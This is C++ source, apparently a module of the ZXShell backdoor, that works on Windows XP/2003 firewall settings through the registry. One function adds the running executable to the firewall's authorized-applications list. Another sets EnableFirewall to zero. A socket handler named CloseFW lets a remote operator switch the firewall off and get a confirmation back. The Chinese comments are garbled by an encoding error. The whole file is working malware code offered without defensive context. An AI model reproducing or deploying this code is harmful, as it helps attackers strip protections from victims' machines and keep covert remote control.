//HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List
/*
xp & 2003 �޸�ע��������رշ���ǽ
*/
enum { OFF, ON};

int BypassWinFirewall()
{
	LONG rc;
	HKEY hKey;
	DWORD dwDisposition;
	DWORD Type = REG_SZ;
	char svcPath[MAX_PATH];
	sprintf(svcPath, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List");
	rc = ZXSAPI::RegCreateKeyEx(HKEY_LOCAL_MACHINE,
                          svcPath, // Name of subkey to open
                          0,
                          NULL,
                          0,
                          KEY_WRITE|KEY_SET_VALUE, // minimal access
                          NULL,
                          &hKey,
                          &dwDisposition
                          );
	if(rc == ERROR_SUCCESS)
	{
		ZXSAPI::GetModuleFileName(NULL, svcPath, MAX_PATH);

		rc = ZXSAPI::RegSetValueEx(hKey, svcPath, 0, Type, (PBYTE)svcPath, lstrlen(svcPath));
		if(rc != ERROR_SUCCESS)
		{
			return rc;
		}
		RegCloseKey(hKey);
		return TRUE;
	}
	return rc;
}

BOOL GetWinFirewallState()
{
	LONG rc;
	HKEY hKey;
	DWORD dwState = 0;
	DWORD Type = REG_DWORD;
	DWORD dwSize = sizeof(DWORD);
	BOOL bRet = FALSE;;

	char svcPath[MAX_PATH];
	sprintf(svcPath, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile");
	rc = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                          svcPath, // Name of subkey to open
                          0,
                          KEY_READ, // minimal access
                          &hKey
                          );
	if(rc == ERROR_SUCCESS)
	{
		rc = ZXSAPI::RegQueryValueEx(hKey,"EnableFirewall",NULL,&Type,(LPBYTE)&dwState,&dwSize);

		if(rc == ERROR_SUCCESS)
		{
			if(dwState)
				bRet = TRUE;
		}else//���ˣ�����û��鵽�ü�ֵ��˵����Ĭ�Ͽ���
			bRet = TRUE;
		
		RegCloseKey(hKey);

		return bRet;
	}else//�򲻿�˵����WIN�汾û����ǽ
	{
		bRet = FALSE;
	}
	return bRet;
}

int TurnWinFirewall(BOOL Flag)
{
	BOOL ret = FALSE;
	LONG rc;
	HKEY hKey;
	DWORD dwDisposition;
	DWORD Type = REG_DWORD;
	char svcPath[MAX_PATH];
	sprintf(svcPath, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile");
	rc = ZXSAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                          svcPath, // Name of subkey to open
                          0,
                          KEY_WRITE|KEY_SET_VALUE, // minimal access
                          &hKey
                          );
	if(rc == ERROR_SUCCESS)
	{

		rc = ZXSAPI::RegSetValueEx(hKey, "EnableFirewall", 0, Type, (PBYTE)&Flag, 4);
		if(rc == ERROR_SUCCESS)
		{
			ret = TRUE;
		}
		RegCloseKey(hKey);
	}
	return ret;
}

int CloseFW(SOCKET Socket)
{
	BOOL ret;
	ret = GetWinFirewallState();
	if(!ret)
	{
		SendMessage(Socket, "The windows firewall not opened.\r\n");
		return 1;
	}
	ret  = TurnWinFirewall(FALSE);
	if(ret)
	{
		SendMessage(Socket, "OK, the windows firewall has been shuted.\r\n");
	}else
	{
		SendMessage(Socket, "failed.\r\n");
	}
	return ret;
}